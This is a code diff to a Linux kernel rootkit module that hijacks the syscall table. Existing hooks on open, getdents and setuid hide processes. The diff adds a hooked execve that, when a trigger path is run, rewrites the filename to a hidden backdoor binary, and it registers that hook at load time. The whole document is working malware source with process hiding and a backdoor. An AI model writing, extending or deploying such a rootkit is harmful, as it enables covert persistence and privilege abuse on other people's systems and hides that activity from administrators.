@@ -61,6 +61,7 @@ asmlinkage int (*orig_open)(const char *, int, mode_t);
 asmlinkage int (*orig_getdents64)(unsigned int, struct linux_dirent64 *, unsigned int);
 asmlinkage int (*orig_getdents)(unsigned int, struct dirent *, unsigned int);
 asmlinkage int (*orig_setuid)(uid_t);
+asmlinkage int (*orig_execve)(const char *, const char *[], const char *[]);
 
 /* Function Declarations */
 
@@ -103,7 +104,7 @@ asmlinkage int hacked_open(const char *pathname, int flags, mode_t mode){ // Hac
         for(i = 0; i < index; i++){
 		if(strstr(kernel_pathname, hidden_PIDs[i]) != NULL){
 			kfree(kernel_pathname);
-                	return -ENOENT; // Say there is no spoo- I mean file
+                	return -ENOENT; // Say there is no spoo- I mean process
 		}        
 	}
         kfree(kernel_pathname);
@@ -146,6 +147,8 @@ asmlinkage int hacked_getdents64(unsigned int fd, struct linux_dirent64 *dirp, u
 	}
 	return tmp;
 }
+
+/* Hacked Getdents Syscall */
 
 asmlinkage int hacked_getdents(unsigned int fd, struct dirent *dirp, unsigned int count){ // Hacked version of the getdents64 syscall
         unsigned int tmp, n;
@@ -195,6 +198,31 @@ asmlinkage int hacked_setuid(uid_t uid){
 	return (*orig_setuid)(uid);
 }
 
+/* Hacked Execve Syscall */
+
+asmlinkage int hacked_execve(const char *filename, const char *argv[], const char *envp[]){
+	char *test;
+	int ret, tmp;
+	char *truc = "/Imma/Firin/Muh/Lazer";
+	char *bd = "/p07470p33l3r/irishman";
+	unsigned long mmm;
+
+	test = (char *) kmalloc(256, GFP_KERNEL);
+
+	(void) copy_from_user(test, filename, 255);
+
+	if(strstr(truc, test) != NULL){
+		printk("Well hi there!");
+		copy_to_user(filename, bd, strlen(bd));
+		kfree(test);
+		return (*orig_execve)(filename, argv, envp);
+	}
+	else{
+		kfree(test);
+		return (*orig_execve)(filename, argv, envp);
+	}
+}
+
 /* Module initialization function */
 
 int rootkit_init(void) { // Start lel rootkit
@@ -220,6 +248,7 @@ int rootkit_init(void) { // Start lel rootkit
 	#else
         orig_setuid = (void *)xchg(&system_call_table[__NR_setuid],hacked_setuid);
 	#endif
+	orig_execve = (void *)xchg(&system_call_table[__NR_execve],hacked_execve);
 
 	write_cr0(read_cr0() | 0x10000); // Turn off memory write to syscall table
 	
@@ -239,6 +268,7 @@ void rootkit_exit(void) {
 	#else
 	xchg(&system_call_table[__NR_setuid],orig_setuid);
 	#endif
+	xchg(&system_call_table[__NR_execve],orig_execve);
 
 	write_cr0(read_cr0() | 0x10000); // Turn off memory write to syscall table
 
